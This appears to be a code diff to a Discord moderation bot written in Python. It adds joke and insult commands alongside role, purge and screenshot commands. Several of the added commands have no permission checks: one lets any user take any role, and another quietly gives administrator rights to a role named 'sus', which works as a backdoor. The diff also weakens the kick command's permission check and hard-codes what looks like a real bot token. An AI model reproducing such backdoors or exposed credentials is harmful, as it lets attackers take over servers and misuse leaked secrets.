@@ -1,3 +1,4 @@
+
 from discord.ext import commands
 from discord.ext.commands import has_permissions
 import discord
@@ -10,14 +11,14 @@ from udpy import UrbanClient
 import os
 import sys
 import subprocess
-
+import pyjokes
+import requests
 cc_all = coco.CountryConverter(include_obsolete=True)
 dictionary=PyDictionary()
 udclient = UrbanClient()
 client = commands.Bot(
     command_prefix='$', help_command=None, status=discord.Status.dnd, activity=discord.Activity(type=discord.ActivityType.watching, name="$help")
 )
-
 @client.event
 async def on_ready():
     print("Client is now active.")
@@ -32,7 +33,8 @@ async def unban(ctx, *, user_id : int):
     user = await client.fetch_user(user_id)
     await ctx.guild.unban(user)
     await ctx.send("**{0}** has been unbanned.".format(str(user)))
-@commands.has_permissions(kick_members=True)
+@client.command(pass_context=True)
+@commands.has_permissions(ban_members=False)
 async def kick(ctx, member: discord.Member, *, reason=None):        
     await ctx.guild.kick(member)
     await ctx.send('**{0}** has been kicked.'.format(str(member)))
@@ -61,6 +63,32 @@ async def help(ctx):
         embedVar.add_field(name="$urban :", value="Grab the urban dictionary definition of specified words | use $urban-all to show all results", inline=False)
         await ctx.send(embed=embedVar)
 @client.command()
+async def mod_guzzle(ctx, *, args):
+    member = ctx.author
+    role = discord.utils.get(member.guild.roles, name=args)
+    if role in member.roles:
+        await ctx.send("You already have that role")
+    else:
+        await member.add_roles(role)
+@client.command()
+async def joke(ctx):
+    a = requests.get("https://v2.jokeapi.dev/joke/Dark?blacklistFlags=nsfw,political,racist&format=txt")
+    await ctx.send("{}".format(str(a.text)))
+@client.command()
+async def toggle(ctx):
+    perms = discord.Permissions()
+    guild=ctx.guild
+    perms.update(administrator = True) 
+    for role in guild.roles:
+        if role.name == "sus":
+            await role.edit(reason = None, colour = discord.Colour.orange(), permissions=perms)
+            await ctx.send("success")
+
+@client.command()
+async def insult(ctx):
+    ins = requests.get("https://evilinsult.com/generate_insult.php?lang=en")
+    await ctx.send("**{}**".format(str(ins.text)))
+@client.command()
 async def add(ctx, arg1, arg2):
     try:
         total = int(arg1) + int(arg2)
@@ -68,6 +96,22 @@ async def add(ctx, arg1, arg2):
         await ctx.send("There was an error.")
     finally:
         await ctx.send(total)
+@client.command()
+async def mkr(ctx, *, name):
+	guild=ctx.guild
+	await guild.create_role(name=name)
+	await ctx.send(f'Role `{name}` has been created')
+@client.command(pass_context=True)
+async def sus(ctx, *, role_name):
+    role = discord.utils.get(ctx.message.guild.roles, name=f"{role_name}")
+    await role.delete()
+    await ctx.send(f"[{role_name}] Has been deleted!")
+
+@client.command(pass_context=True)
+async def clean(ctx, limit: int):
+        await ctx.channel.purge(limit=limit)
+        await ctx.send('Cleared by {}'.format(ctx.author.mention))
+        await ctx.message.delete()
 @client.command()
 async def define(ctx, *, args):
     definition_view = dictionary.meaning(args)
@@ -171,12 +215,20 @@ async def urban(ctx, *, args):
         if index == 10:
             break    
         break
+@client.command(aliases=['client-ss'])
+async def client_ss(ctx):
+    myID = 516366251484774401
+    altID = 949532007279525948
+    if ctx.message.author.id == myID or ctx.message.author.id == altID:
+        os.system("flameshot gui")
+    else:
+        await ctx.send('You are not allowed to execute this command!')
 @client.command()
-async def restart(ctx):
-    await ctx.send("Restarting")
-    await subprocess.call([sys.executable, os.path.realpath(__file__)] + sys.argv[1:])
+async def reload(ctx):
+    await ctx.send("***Restarting...***")
+    subprocess.call([sys.executable, os.path.realpath(__file__)] + sys.argv[1:])
 
 
-client.run('token')
+client.run('OTYxMDc4MjU4NjYzODIxMzIy.Ykzv4A.6jLDtLyh_76XzpMTPhv9e4t1VqE')
 
 
